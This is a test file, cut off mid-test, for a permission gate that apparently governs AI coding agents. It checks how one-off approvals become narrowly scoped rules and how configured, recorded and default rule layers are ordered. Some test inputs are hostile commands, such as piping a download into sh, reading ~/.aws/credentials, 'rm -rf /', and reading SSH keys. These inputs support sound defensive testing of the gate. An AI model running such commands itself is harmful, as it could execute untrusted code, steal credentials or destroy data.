/**
 * The written half of a permission policy: deriving a rule from one answered request, the
 * sidecar it is written to, and the order the two halves are evaluated in.
 *
 * The two groups that matter are named for the two ways deriving a rule goes wrong. A rule
 * *broader* than the request it came from is a security bug: the person allowed one thing
 * and got another. A rule *narrower* than the request never matches again, so "always"
 * silently means "once" and the prompt comes back forever. Both have their own describe
 * block below, with concrete cases, because both are the deliverable.
 */
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  AgentSpecSchema,
  DEFAULT_PERMISSION_POLICY,
  derivePermissionRules,
  isWildcardPermissionRule,
  layerPermissionPolicies,
  PERMISSION_POLICY_FILENAME,
  PermissionPolicySchema,
  workspaceRelativePath,
} from "@orca/core";
import type { PermissionPolicy, PermissionRule } from "@orca/core";
import {
  decidePermission,
  loadEffectivePermissionPolicy,
  permissionOverlayFor,
  permissionPolicyPath,
  existingDirectoryWithin,
  protectedPathFor,
  readPermissionPolicyFile,
  recordAlwaysDecision,
  replacePermissionPolicyFile,
  resolvePermission,
  type ProtectedPaths,
} from "@orca/agents";

const WS = "/w/orca";

const req = (kind: string, title: string, ...paths: string[]) =>
  ({
    sessionId: "s",
    toolCall: { toolCallId: "t", title, kind, locations: paths.map((path) => ({ path })) },
    options: [
      { optionId: "once", name: "Allow once", kind: "allow_once" },
      { optionId: "always", name: "Allow always", kind: "allow_always" },
    ],
  }) as never;

const dirs: string[] = [];
async function workspace(): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), "orca-perm-"));
  dirs.push(dir);
  return dir;
}
afterEach(async () => {
  for (const d of dirs.splice(0)) await rm(d, { recursive: true, force: true });
});

const derive = (kind: string, title: string, ...paths: string[]) =>
  derivePermissionRules({ kind, title, paths, workspaceCwd: WS }, "allow");

function rules(kind: string, title: string, ...paths: string[]): PermissionRule[] {
  const d = derive(kind, title, ...paths);
  if (!d.ok) throw new Error(`expected a rule, got ${d.reason}: ${d.detail}`);
  return d.rules;
}

/** A policy of nothing but the derived rules, defaulting to "ask" so only a match allows. */
const onlyDerived = (derived: PermissionRule[]): PermissionPolicy => ({ default: "ask", rules: derived });

it("ordinary workspace reads resolve without invoking a human approval callback", async () => {
  let asked = false;
  const result = await resolvePermission(DEFAULT_PERMISSION_POLICY, {
    request: req("read", "Read source", `${WS}/src/main.ts`),
    scope: { workspaceCwd: WS },
    ask: async () => {
      asked = true;
      return "once";
    },
  });
  expect(result).toMatchObject({ decision: "allow", response: { outcome: { outcome: "selected", optionId: "once" } } });
  expect(asked).toBe(false);
});

describe("deriving a rule: it must not be broader than the request", () => {
  it("scopes an edit to the one file, not to its directory and not to the filesystem", () => {
    const derived = rules("edit", "Edit agent.ts", `${WS}/packages/core/src/model/agent.ts`);
    expect(derived).toEqual([{ match: { kind: "edit", path: "packages/core/src/model/agent.ts" }, decision: "allow" }]);
    const policy = onlyDerived(derived);
    // The file it was granted for.
    expect(
      decidePermission(policy, req("edit", "Edit", `${WS}/packages/core/src/model/agent.ts`), { workspaceCwd: WS }),
    ).toBe("allow");
    // A sibling in the same directory is a different file.
    expect(
      decidePermission(policy, req("edit", "Edit", `${WS}/packages/core/src/model/run.ts`), { workspaceCwd: WS }),
    ).toBe("ask");
    // The directory itself, and anything deeper under a path that merely shares the prefix.
    expect(decidePermission(policy, req("edit", "Edit", `${WS}/packages/core/src/model`), { workspaceCwd: WS })).toBe(
      "ask",
    );
    expect(
      decidePermission(policy, req("edit", "Edit", `${WS}/packages/core/src/model/agent.ts.bak`), { workspaceCwd: WS }),
    ).toBe("ask");
  });

  it("does not let a grant for one kind become a grant for another on the same file", () => {
    const policy = onlyDerived(rules("read", "Read secrets", `${WS}/config/keys.env`));
    expect(decidePermission(policy, req("read", "Read", `${WS}/config/keys.env`), { workspaceCwd: WS })).toBe("allow");
    expect(decidePermission(policy, req("edit", "Edit", `${WS}/config/keys.env`), { workspaceCwd: WS })).toBe("ask");
    expect(decidePermission(policy, req("delete", "Delete", `${WS}/config/keys.env`), { workspaceCwd: WS })).toBe(
      "ask",
    );
  });

  it("never writes a standing allow for an execute: the words do not prove what runs (#702 review)", () => {
    const d = derivePermissionRules(
      { kind: "execute", title: "npm test", paths: [`${WS}/packages/core`], workspaceCwd: WS },
      "allow",
    );
    expect(d.ok === false && d.reason).toBe("unverified-command");
  });

  it("scopes an execute deny to its exact command, never to the directory it ran in", () => {
    const d = derivePermissionRules(
      { kind: "execute", title: "npm test", paths: [`${WS}/packages/core`], workspaceCwd: WS },
      "deny",
    );
    expect(d.ok && d.rules).toEqual([{ match: { kind: "execute", titlePattern: "^npm test$" }, decision: "deny" }]);
    const policy = onlyDerived(d.ok ? d.rules : []);
    expect(decidePermission(policy, req("execute", "npm test", `${WS}/packages/core`), { workspaceCwd: WS })).toBe(
      "deny",
    );
    // A deny for `npm test` in a directory is not a deny for the directory.
    expect(decidePermission(policy, req("execute", "ls", `${WS}/packages/core`), { workspaceCwd: WS })).toBe("ask");
  });

  it("anchors a derived title pattern and escapes it, so a title is a literal and not a regex", () => {
    const derived = rules("fetch", "GET https://api.example.com/v1/things?x=1");
    expect(derived[0]?.match.titlePattern).toBe("^GET https://api\\.example\\.com/v1/things\\?x=1$");
    const policy = onlyDerived(derived);
    expect(decidePermission(policy, req("fetch", "GET https://api.example.com/v1/things?x=1"), {})).toBe("allow");
    // Unescaped, `.` would have matched any character and the pattern would be unanchored.
    expect(decidePermission(policy, req("fetch", "GET https://apiXexample.com/v1/things?x=1"), {})).toBe("ask");
    expect(decidePermission(policy, req("fetch", "see GET https://api.example.com/v1/things?x=1 now"), {})).toBe("ask");
  });

  it("refuses rather than grant anything outside the workspace", () => {
    for (const path of ["/etc/hosts", "/home/casey/.ssh/id_ed25519", `${WS}/../other-checkout/src/a.ts`]) {
      const d = derivePermissionRules({ kind: "edit", title: "Edit", paths: [path], workspaceCwd: WS }, "allow");
      expect(d.ok).toBe(false);
      expect(d.ok === false && d.reason).toBe("outside-workspace");
    }
  });

  it("refuses the workspace root itself, which is every path in the workspace in disguise", () => {
    const d = derivePermissionRules({ kind: "edit", title: "Edit", paths: [`${WS}/`], workspaceCwd: WS }, "allow");
    expect(d.ok === false && d.reason).toBe("whole-workspace");
  });

  it("refuses a bare kind when there is neither a location nor a title to pin it to", () => {
    const d = derivePermissionRules({ kind: "execute", title: "  ", paths: [], workspaceCwd: WS }, "deny");
    expect(d.ok === false && d.reason).toBe("unscopable");
    expect(derivePermissionRules({ kind: "other", paths: [], workspaceCwd: WS }, "allow").ok).toBe(false);
  });

  it("refuses a path rule when there is no workspace to scope it to", () => {
    const d = derivePermissionRules({ kind: "edit", title: "Edit", paths: ["/w/orca/src/a.ts"] }, "allow");
    expect(d.ok === false && d.reason).toBe("outside-workspace");
  });

  it("derives a deny exactly as narrowly, because a too-broad deny blocks work silently", () => {
    const d = derivePermissionRules(
      { kind: "delete", title: "Delete dist", paths: [`${WS}/dist/main.js`], workspaceCwd: WS },
      "deny",
    );
    expect(d.ok && d.rules).toEqual([{ match: { kind: "delete", path: "dist/main.js" }, decision: "deny" }]);
  });

  it("records nothing for an answer that was not 'always'", () => {
    const d = derivePermissionRules({ kind: "edit", title: "Edit", paths: [`${WS}/a.ts`], workspaceCwd: WS }, "ask");
    expect(d.ok === false && d.reason).toBe("not-recordable");
  });
});

describe("deriving a rule: it must not be narrower than the request either", () => {
  it("matches the same file again from a different worktree, because the path is workspace-relative", () => {
    const policy = onlyDerived(rules("edit", "Edit", `${WS}/packages/core/src/model/agent.ts`));
    // The next run gets a fresh git worktree at a different absolute path. Same grant.
    const next = "/home/casey/orca-worktrees/feature-x";
    expect(
      decidePermission(policy, req("edit", "Edit", `${next}/packages/core/src/model/agent.ts`), { workspaceCwd: next }),
    ).toBe("allow");
  });

  it("matches a request that gives the path relative rather than absolute", () => {
    const policy = onlyDerived(rules("edit", "Edit", `${WS}/src/a.ts`));
    expect(decidePermission(policy, req("edit", "Edit", "src/a.ts"), { workspaceCwd: WS })).toBe("allow");
  });

  it("does not encode a title into a path rule, so the same file under a different verb still matches", () => {
    const derived = rules("edit", "Write src/a.ts (attempt 3)", `${WS}/src/a.ts`);
    expect(derived[0]?.match.titlePattern).toBeUndefined();
    expect(
      decidePermission(onlyDerived(derived), req("edit", "Apply patch to src/a.ts", `${WS}/src/a.ts`), {
        workspaceCwd: WS,
      }),
    ).toBe("allow");
  });

  it("refuses a path that carries a run id, rather than write a rule that can never match again", () => {
    const d = derivePermissionRules(
      {
        kind: "edit",
        title: "Edit",
        paths: [`${WS}/.orca/runs/run_01J9ZQ8KTQ4M2X7R5N6P3B0CDE/notes.md`],
        workspaceCwd: WS,
      },
      "allow",
    );
    expect(d.ok === false && d.reason).toBe("volatile");
    expect(d.ok === false && d.detail).toContain("ORCA id");
  });

  it("refuses the other one-off shapes: temp directories, digests, uuids and timestamps", () => {
    const volatile: [string, string][] = [
      ["execute", "cat /tmp/orca-x9f2k1/out.txt"],
      ["execute", "node build/3f9a1c8b2e7d4a6f0b1c.js"],
      ["execute", "tail logs/2026-09-20T11:03:44.log"],
      ["execute", "open report-1758369824123.html"],
      ["fetch", "GET https://x/9f8e7d6c-1a2b-3c4d-5e6f-0a1b2c3d4e5f"],
    ];
    for (const [kind, title] of volatile) {
      const d = derivePermissionRules({ kind, title, paths: [], workspaceCwd: WS }, "deny");
      expect(d.ok, `${title} should be refused as volatile`).toBe(false);
      expect(d.ok === false && d.reason).toBe("volatile");
    }
  });

  it("keeps a stable command that merely contains digits", () => {
    const d = derivePermissionRules(
      { kind: "execute", title: "node --max-old-space-size=4096 build.js", paths: [] },
      "deny",
    );
    expect(d.ok && d.rules[0]?.match.titlePattern).toBe("^node --max-old-space-size=4096 build\\.js$");
  });

  it("writes one rule per location, so a move that needs both paths gets both", () => {
    const derived = rules("move", "Move a.ts to b.ts", `${WS}/src/a.ts`, `${WS}/src/b.ts`);
    expect(derived.map((r) => r.match.path)).toEqual(["src/a.ts", "src/b.ts"]);
    const policy = onlyDerived(derived);
    expect(
      decidePermission(policy, req("move", "Move", `${WS}/src/a.ts`, `${WS}/src/b.ts`), { workspaceCwd: WS }),
    ).toBe("allow");
  });

  it("does not write the same rule twice when a request lists a path twice", () => {
    const derived = rules("read", "Read", `${WS}/src/a.ts`, `${WS}/./src/a.ts`);
    expect(derived).toHaveLength(1);
  });
});

describe("workspaceRelativePath", () => {
  it("relativises inside, refuses outside, and passes an already-relative path through", () => {
    expect(workspaceRelativePath("/w/orca/src/a.ts", WS)).toBe("src/a.ts");
    expect(workspaceRelativePath("/w/orca", WS)).toBe("");
    expect(workspaceRelativePath("/w/orca-other/src/a.ts", WS)).toBeUndefined();
    expect(workspaceRelativePath("/etc/hosts", WS)).toBeUndefined();
    expect(workspaceRelativePath("src/a.ts", WS)).toBe("src/a.ts");
    expect(workspaceRelativePath("../escape.ts", WS)).toBeUndefined();
    expect(workspaceRelativePath("/w/orca/src/a.ts", undefined)).toBeUndefined();
  });
});

describe("layering", () => {
  const configured = PermissionPolicySchema.parse({
    default: "ask",
    rules: [{ match: { kind: "execute", titlePattern: "^rm " }, decision: "deny" }],
  });

  it("puts the configured rules first, so configuration outranks anything a machine wrote", () => {
    const written: PermissionRule[] = [
      { match: { kind: "execute", titlePattern: "^rm -rf build$" }, decision: "allow" },
    ];
    const policy = layerPermissionPolicies(configured, written);
    expect(policy.rules[0]).toEqual(configured.rules[0]);
    // The configured deny is reached first and wins, even though the sidecar allows it.
    expect(decidePermission(policy, req("execute", "rm -rf build"), {})).toBe("deny");
    // Where configuration is silent, the sidecar decides.
    expect(
      decidePermission(
        layerPermissionPolicies(configured, [{ match: { kind: "read", path: "a.ts" }, decision: "allow" }]),
        req("read", "Read", `${WS}/a.ts`),
        { workspaceCwd: WS },
      ),
    ).toBe("allow");
  });

  it("takes the default from configuration only, so a layer can add rules but never widen the fallback", () => {
    expect(layerPermissionPolicies(configured, []).default).toBe("ask");
  });

  it("admits a third layer under the second without any change of shape", () => {
    const workspaceLayer: PermissionRule[] = [{ match: { kind: "read", path: "a.ts" }, decision: "deny" }];
    const userLayer: PermissionRule[] = [{ match: { kind: "read", path: "a.ts" }, decision: "allow" }];
    const policy = layerPermissionPolicies(configured, workspaceLayer, userLayer);
    expect(policy.rules).toHaveLength(3);
    // Workspace before user: the nearer file wins.
    expect(decidePermission(policy, req("read", "Read", `${WS}/a.ts`), { workspaceCwd: WS })).toBe("deny");
  });

  it("drops provenance, leaving a plain PermissionPolicy", () => {
    const doc = {
      version: 1 as const,
      agents: {
        a: {
          rules: [
            {
              match: { kind: "read" as const, path: "a.ts" },
              decision: "allow" as const,
              addedAt: "2026-01-01T00:00:00.000Z",
              grantedFor: "Read a.ts",
            },
          ],
        },
      },
    };
    expect(permissionOverlayFor(doc, "a")).toEqual([{ match: { kind: "read", path: "a.ts" }, decision: "allow" }]);
    expect(permissionOverlayFor(doc, "b")).toEqual([]);
  });
});

/**
 * The policy an agent gets when its config says nothing (#140). The shape of the claim is
 * "inside the workspace is work, everything else is a question": a `default: allow` agent
 * could read a sibling checkout and run any shell command, and neither read like a mistake
 * in the event log until someone went looking.
 */
const bare = AgentSpecSchema.parse({ id: "bare", command: "claude-code-acp" });
// The defaults are a *layer*, not part of the parsed config, so every evaluation below goes
// through the thing that adds them (#140). `[]` is "no sidecar", which is the bare case.
const bareEffective = await loadEffectivePermissionPolicy(bare, []);

describe("the default policy", () => {
  const at = (policy: PermissionPolicy, kind: string, title: string, ...paths: string[]) =>
    decidePermission(policy, req(kind, title, ...paths), { workspaceCwd: WS });

  it("is what an agent with no permissions block gets, and it is not in the parsed config", () => {
    // Parsing injects nothing: the configured half of a policy is exactly what the file said,
    // and `default` is *absent* rather than resolved to "ask" - which is what says nobody
    // chose a fallthrough, and so what opts this agent in to the default rules at all.
    expect(bare.permissions).toEqual({ rules: [] });
    expect(bare.permissions.default).toBeUndefined();
    expect(bareEffective).toEqual(DEFAULT_PERMISSION_POLICY);
    expect(bareEffective.default).toBe("ask");
  });

  /**
   * The distinction the whole of #140's gating rests on. `permissions:` absent and
   * `permissions: { default: ask }` used to be the same policy; they are now two, and the
   * second one is somebody saying "ask me about everything" and meaning it.
   */
  it("is opted out of by an explicit `default: ask`, which is not the same as saying nothing", async () => {
    const asked = AgentSpecSchema.parse({ id: "a", command: "x", permissions: { default: "ask" } });
    const policy = await loadEffectivePermissionPolicy(asked, []);

    // No rules at all: the default layer is not appended, so there is nothing to match.
    expect(policy).toEqual({ default: "ask", rules: [] });
    expect(at(policy, "read", "Read src/a.ts", `${WS}/src/a.ts`)).toBe("ask");
    expect(at(policy, "edit", "Edit src/a.ts", `${WS}/src/a.ts`)).toBe("ask");
    expect(at(policy, "think", "Think")).toBe("ask");

    // And the same agent with `default:` left out gets the rules, and is allowed.
    const silent = AgentSpecSchema.parse({ id: "a", command: "x", permissions: { rules: [] } });
    const opted = await loadEffectivePermissionPolicy(silent, []);
    expect(opted.rules).toEqual(DEFAULT_PERMISSION_POLICY.rules);
    expect(at(opted, "read", "Read src/a.ts", `${WS}/src/a.ts`)).toBe("allow");
    expect(at(opted, "edit", "Edit src/a.ts", `${WS}/src/a.ts`)).toBe("allow");
  });

  it("allows reading, searching and changing files inside the workspace", () => {
    expect(at(bareEffective, "read", "Read src/strings.js", `${WS}/src/strings.js`)).toBe("allow");
    expect(at(bareEffective, "search", "Grep", `${WS}/packages`)).toBe("allow");
    expect(at(bareEffective, "edit", "Edit src/a.ts", `${WS}/src/a.ts`)).toBe("allow");
    expect(at(bareEffective, "delete", "Delete src/a.ts", `${WS}/src/a.ts`)).toBe("allow");
    // A relative location is already workspace-relative, so it is inside by construction.
    expect(at(bareEffective, "read", "Read", "src/a.ts")).toBe("allow");
    // The workspace root itself is inside the workspace.
    expect(at(bareEffective, "read", "Read", WS)).toBe("allow");
  });

  it("asks for a read or a write outside the workspace", () => {
    for (const path of ["/etc/hosts", "/home/casey/.ssh/id_ed25519", `${WS}/../other-checkout/docs/REAL.md`]) {
      expect(at(bareEffective, "read", "Read", path)).toBe("ask");
      expect(at(bareEffective, "edit", "Edit", path)).toBe("ask");
    }
    // This is the run #140 was filed about: a planning agent reading a sibling checkout.
    expect(at(bareEffective, "read", "Read REAL-AGENT-TEST.md", "/srv/dev/orca/docs/REAL-AGENT-TEST.md")).toBe("ask");
  });

  it("asks for a move that takes a file out of the workspace, though both legs look ordinary", () => {
    expect(at(bareEffective, "move", "Move", `${WS}/src/a.ts`, `${WS}/src/b.ts`)).toBe("allow");
    expect(at(bareEffective, "move", "Move", `${WS}/src/a.ts`, "/tmp/a.ts")).toBe("ask");
  });

  it("asks for an execute wherever it runs, because ORCA only ever sees the command's text", () => {
    expect(at(bareEffective, "execute", "npm test", `${WS}/packages/core`)).toBe("ask");
    expect(at(bareEffective, "execute", "git push --force", WS)).toBe("ask");
    expect(at(bareEffective, "execute", "cat ~/.aws/credentials")).toBe("ask");
    // And for the network, which has no location to be inside anything.
    expect(at(bareEffective, "fetch", "GET https://example.com")).toBe("ask");
  });

  it("treats an absolute path as outside when there is no workspace to measure it against", () => {
    expect(decidePermission(bareEffective, req("read", "Read", "/srv/x/a.ts"), {})).toBe("ask");
  });

  it("is opted out of, whole, by an explicit default", async () => {
    const sandbox = AgentSpecSchema.parse({ id: "s", command: "x", permissions: { default: "allow" } });
    expect(sandbox.permissions).toEqual({ default: "allow", rules: [] });
    const policy = await loadEffectivePermissionPolicy(sandbox, []);
    // Nothing is appended - the author said what the fallthrough is - and for `allow` that
    // makes no difference to the outcome, because the default rules only ever allowed.
    expect(policy.rules).toEqual([]);
    expect(at(policy, "execute", "rm -rf /")).toBe("allow");
    expect(at(policy, "read", "Read", "/etc/hosts")).toBe("allow");
  });

  it("sits behind the configured rules when only `default` is left out, so a configured rule still wins", async () => {
    const agent = AgentSpecSchema.parse({
      id: "a",
      command: "x",
      permissions: { rules: [{ match: { kind: "edit", pathPrefix: "vendor" }, decision: "deny" }] },
    });
    expect(agent.permissions.default).toBeUndefined();
    // One configured rule means one rule in the parsed config, not one plus the defaults.
    expect(agent.permissions.rules).toEqual([{ match: { kind: "edit", pathPrefix: "vendor" }, decision: "deny" }]);
    const policy = await loadEffectivePermissionPolicy(agent, []);
    expect(policy.rules).toHaveLength(1 + DEFAULT_PERMISSION_POLICY.rules.length);
    // The configured deny is matched first, even though the default would allow this edit.
    expect(at(policy, "edit", "Edit vendor/x.js", `${WS}/vendor/x.js`)).toBe("deny");
    expect(at(policy, "edit", "Edit src/x.ts", `${WS}/src/x.ts`)).toBe("allow");
  });

  /**
   * The bug #140's first cut left behind: the defaults were folded into the *parsed config*,
   * so a default `allow` on an in-workspace edit was matched before the sidecar was reached
   * and a recorded `reject_always` could never fire. ADR 0009 puts the sidecar second and
   * rules nobody wrote last.
   */
  it("lets a sidecar deny beat the default allow on an in-workspace edit", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const agent = AgentSpecSchema.parse({ id: "a", command: "x" });
    const request = req("edit", "Edit src/generated.ts", `${dir}/src/generated.ts`);

    // Before anyone says otherwise the default layer allows it: it is inside the workspace.
    expect(decidePermission(await loadEffectivePermissionPolicy(agent, [file]), request, { workspaceCwd: dir })).toBe(
      "allow",
    );
    // Somebody answers "never" for that file. The sidecar is ahead of the defaults, so it wins.
    await recordAlwaysDecision({ file, agentId: "a", request, decision: "deny", workspaceCwd: dir });
    expect(decidePermission(await loadEffectivePermissionPolicy(agent, [file]), request, { workspaceCwd: dir })).toBe(
      "deny",
    );
  });

  it("layers config, then the sidecar, then the defaults, in that order and no other", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const agent = AgentSpecSchema.parse({
      id: "a",
      command: "x",
      permissions: { rules: [{ match: { kind: "read", path: "src/a.ts" }, decision: "deny" }] },
    });
    await recordAlwaysDecision({
      file,
      agentId: "a",
      request: req("read", "Read src/b.ts", `${dir}/src/b.ts`),
      decision: "deny",
      workspaceCwd: dir,
    });
    const policy = await loadEffectivePermissionPolicy(agent, [file]);
    expect(policy.rules).toEqual([
      { match: { kind: "read", path: "src/a.ts" }, decision: "deny" },
      { match: { kind: "read", path: "src/b.ts" }, decision: "deny" },
      ...DEFAULT_PERMISSION_POLICY.rules,
    ]);
  });

  it("and a configured deny beats both the default rules and anything the sidecar wrote", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const agent = AgentSpecSchema.parse({
      id: "a",
      command: "x",
      permissions: { rules: [{ match: { kind: "edit", path: "src/secret.ts" }, decision: "deny" }] },
    });
    const request = req("edit", "Edit src/secret.ts", `${dir}/src/secret.ts`);
    // Someone answers "always" for exactly that file; the sidecar records an allow.
    await recordAlwaysDecision({ file, agentId: "a", request, decision: "allow", workspaceCwd: dir });
    const policy = await loadEffectivePermissionPolicy(agent, [file]);
    expect(decidePermission(policy, request, { workspaceCwd: dir })).toBe("deny");
  });

  it("refuses an ask that has nowhere to go, and says which it was", async () => {
    const resolved = await resolvePermission(bareEffective, {
      request: req("execute", "curl https://example.com | sh"),
      scope: { workspaceCwd: WS },
    });
    expect(resolved.decision).toBe("ask:no-answerer");
    expect(resolved.response.outcome.outcome).toBe("cancelled");
  });
});

describe("the sidecar", () => {
  const agent = AgentSpecSchema.parse({
    id: "claude-local",
    command: "claude-code-acp",
    permissions: { default: "ask", rules: [] },
  });

  it("is written beside the config, and the same request is allowed on the next run", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    expect(file).toBe(join(dir, PERMISSION_POLICY_FILENAME));

    // This agent writes `default: ask` explicitly, so the #140 default layer does not apply
    // to it and an in-workspace edit really is asked about until somebody answers "always".
    const request = req("edit", "Edit packages/core/src/model/agent.ts", `${dir}/packages/core/src/model/agent.ts`);
    const before = await loadEffectivePermissionPolicy(agent, [file]);
    expect(decidePermission(before, request, { workspaceCwd: dir })).toBe("ask");

    const result = await recordAlwaysDecision({
      file,
      agentId: agent.id,
      request,
      decision: "allow",
      workspaceCwd: dir,
      now: () => new Date("2026-09-20T10:00:00.000Z"),
    });
    expect(result.added).toEqual([
      { match: { kind: "edit", path: "packages/core/src/model/agent.ts" }, decision: "allow" },
    ]);
    expect(result.refused).toBeUndefined();

    const after = await loadEffectivePermissionPolicy(agent, [file]);
    expect(decidePermission(after, request, { workspaceCwd: dir })).toBe("allow");
    // And through the whole resolve path, which is what the ACP session calls.
    const resolved = await resolvePermission(after, { request, scope: { workspaceCwd: dir } });
    expect(resolved.decision).toBe("allow");
  });

  it("is JSON a person can read, with the provenance a reviewer needs", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    await recordAlwaysDecision({
      file,
      agentId: "claude-local",
      request: req("edit", "Edit src/a.ts", `${dir}/src/a.ts`),
      decision: "allow",
      workspaceCwd: dir,
      now: () => new Date("2026-09-20T10:00:00.000Z"),
    });
    expect(await readFile(file, "utf8")).toBe(
      `{
  "version": 1,
  "agents": {
    "claude-local": {
      "rules": [
        {
          "match": {
            "kind": "edit",
            "path": "src/a.ts"
          },
          "decision": "allow",
          "addedAt": "2026-09-20T10:00:00.000Z",
          "grantedFor": "Edit src/a.ts"
        }
      ]
    }
  }
}
`,
    );
  });

  it("does not append the same grant twice", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const request = req("edit", "Edit src/a.ts", `${dir}/src/a.ts`);
    const opts = { file, agentId: "a", request, decision: "allow" as const, workspaceCwd: dir };
    await recordAlwaysDecision(opts);
    const second = await recordAlwaysDecision(opts);
    expect(second.added).toEqual([]);
    expect(second.alreadyPresent).toHaveLength(1);
    expect((await readPermissionPolicyFile(file)).agents["a"]?.rules).toHaveLength(1);
  });

  it("keeps both grants when two runs answer 'always' at the same moment", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const answers = ["src/a.ts", "src/b.ts", "src/c.ts", "src/d.ts"].map((p) =>
      recordAlwaysDecision({
        file,
        agentId: "a",
        request: req("edit", `Edit ${p}`, `${dir}/${p}`),
        decision: "allow",
        workspaceCwd: dir,
      }),
    );
    await Promise.all(answers);
    const doc = await readPermissionPolicyFile(file);
    expect((doc.agents["a"]?.rules ?? []).map((r) => r.match.path).sort()).toEqual([
      "src/a.ts",
      "src/b.ts",
      "src/c.ts",
      "src/d.ts",
    ]);
  });

  it("reports a refusal instead of writing, so the caller can honour the answer just once", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const result = await recordAlwaysDecision({
      file,
      agentId: "a",
      request: req("edit", "Edit /etc/hosts", "/etc/hosts"),
      decision: "allow",
      workspaceCwd: dir,
    });
    expect(result.refused?.reason).toBe("outside-workspace");
    expect(result.added).toEqual([]);
    await expect(readFile(file, "utf8")).rejects.toThrow();
  });

  it("treats a missing file as no rules and a corrupt one as an error, never as no rules", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    expect(await readPermissionPolicyFile(file)).toEqual({ version: 1, agents: {} });
    await writeFile(file, "", "utf8");
    expect(await readPermissionPolicyFile(file)).toEqual({ version: 1, agents: {} });
    await writeFile(file, "{ not json", "utf8");
    await expect(readPermissionPolicyFile(file)).rejects.toMatchObject({ code: "CONFIG_INVALID" });
    await writeFile(file, JSON.stringify({ version: 2, agents: {} }), "utf8");
    await expect(readPermissionPolicyFile(file)).rejects.toMatchObject({ code: "CONFIG_INVALID" });
  });

  it("layers a hand-edited sidecar under the configured rules", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    await writeFile(
      file,
      JSON.stringify({
        version: 1,
        agents: { "claude-local": { rules: [{ match: { kind: "read", path: "src/a.ts" }, decision: "allow" }] } },
      }),
      "utf8",
    );
    const policy = await loadEffectivePermissionPolicy(agent, [file]);
    expect(decidePermission(policy, req("read", "Read", `${dir}/src/a.ts`), { workspaceCwd: dir })).toBe("allow");
    // This agent sets `default: ask`, so there is no default layer to fall through to: a file
    // the sidecar says nothing about is asked about, inside the workspace or not.
    expect(decidePermission(policy, req("read", "Read", `${dir}/src/b.ts`), { workspaceCwd: dir })).toBe("ask");
  });
});

/**
 * The operator's half of ADR 0009 (#266): `config.set` on the `permissions` document edits
 * or removes a grant a machine wrote, and it does so through this writer rather than through
 * a second path in the daemon - a `link()` lock is only a lock if every writer takes it.
 */
describe("replacing the sidecar", () => {
  it("writes the same fixed key order a machine write uses", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);

    await replacePermissionPolicyFile(file, {
      version: 1,
      agents: {
        zeta: { rules: [{ match: { kind: "read", path: "src/z.ts" }, decision: "allow" }] },
        alpha: { rules: [{ match: { pathPrefix: "docs" }, decision: "deny", grantedFor: "Read docs" }] },
      },
    });

    const text = await readFile(file, "utf8");
    // Agents sorted, `match` before `decision`, provenance last, trailing newline: a rewrite
    // by either writer is a minimal diff, which is why the file is JSON at all.
    expect(text.indexOf(`"alpha"`)).toBeLessThan(text.indexOf(`"zeta"`));
    expect(text.indexOf(`"match"`)).toBeLessThan(text.indexOf(`"decision"`));
    expect(text.endsWith("\n")).toBe(true);
    expect((await readPermissionPolicyFile(file)).agents["alpha"]?.rules[0]?.decision).toBe("deny");
  });

  it("refuses a document carrying a `default` and writes nothing", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);

    // Answering one prompt must not change the answer to every other one. Accepting the
    // write and silently dropping the field would report success for an edit that did
    // nothing, which is the worse failure of the two.
    await expect(replacePermissionPolicyFile(file, { version: 1, default: "allow", agents: {} })).rejects.toMatchObject(
      { code: "CONFIG_INVALID" },
    );
    await expect(readFile(file, "utf8")).rejects.toThrow();
  });

  /**
   * `expectedRevision` is re-hashed *inside* the lock, which is the whole of the point: the
   * daemon used to compare revisions and then call this, and a grant appended in between was
   * replaced away. Checked here, there is no in-between.
   */
  it("refuses a replace whose expectedRevision is not the file's, and writes nothing", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const hashOf = async () =>
      createHash("sha256")
        .update(await readFile(file))
        .digest("hex");

    // A file that is not there hashes to `""`, and asserting that is how a first write is made.
    await replacePermissionPolicyFile(
      file,
      { version: 1, agents: { alpha: { rules: [{ match: { kind: "read", path: "a.ts" }, decision: "allow" }] } } },
      { expectedRevision: "" },
    );
    const revision = await hashOf();

    // Somebody else writes. The operator's edit was made against `revision`, which is now old.
    await recordAlwaysDecision({
      file,
      agentId: "beta",
      request: req("edit", "Edit src/b.ts", `${dir}/src/b.ts`),
      decision: "allow",
      workspaceCwd: dir,
    });
    const moved = await hashOf();
    expect(moved).not.toBe(revision);

    await expect(
      replacePermissionPolicyFile(file, { version: 1, agents: {} }, { expectedRevision: revision }),
    ).rejects.toMatchObject({
      code: "CONFIG_STALE",
      details: { expectedRevision: revision, actualRevision: moved },
    });
    // Refused, not half-applied: both agents are still there.
    expect(Object.keys((await readPermissionPolicyFile(file)).agents).sort()).toEqual(["alpha", "beta"]);
    // And the same replace against the revision the file actually has goes through.
    await replacePermissionPolicyFile(file, { version: 1, agents: {} }, { expectedRevision: moved });
    expect(Object.keys((await readPermissionPolicyFile(file)).agents)).toEqual([]);
  });

  it("serialises against a concurrent `recordAlwaysDecision` instead of overwriting it", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    // A grant already recorded, so the operator's edit has something to have read.
    await recordAlwaysDecision({
      file,
      agentId: "claude-local",
      request: req("edit", "Edit src/a.ts", `${dir}/src/a.ts`),
      decision: "allow",
      workspaceCwd: dir,
    });
    const held = await readPermissionPolicyFile(file);

    await Promise.all([
      recordAlwaysDecision({
        file,
        agentId: "codex",
        request: req("edit", "Edit src/b.ts", `${dir}/src/b.ts`),
        decision: "allow",
